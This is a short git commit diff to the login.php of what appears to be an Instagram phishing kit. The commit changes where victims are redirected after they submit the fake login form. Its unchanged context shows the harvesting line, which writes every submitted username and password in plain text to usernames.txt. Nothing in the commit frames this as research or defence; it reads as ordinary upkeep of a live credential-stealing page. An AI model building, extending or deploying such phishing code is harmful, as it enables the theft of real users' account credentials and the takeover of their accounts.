caee3e97325b6f838ebe236c8e54a4734e9a67a2
Haze <127317838+maskedwrrg@users.noreply.github.com>
2026-01-07 21:20:32 -0500

    Change redirect URL after login

--- .sites/instagram/login.php
+++ .sites/instagram/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://instagram.com');
+header('Location: https://now.gg/apps/instagram/1228/instagram.html');
 exit();
 ?>
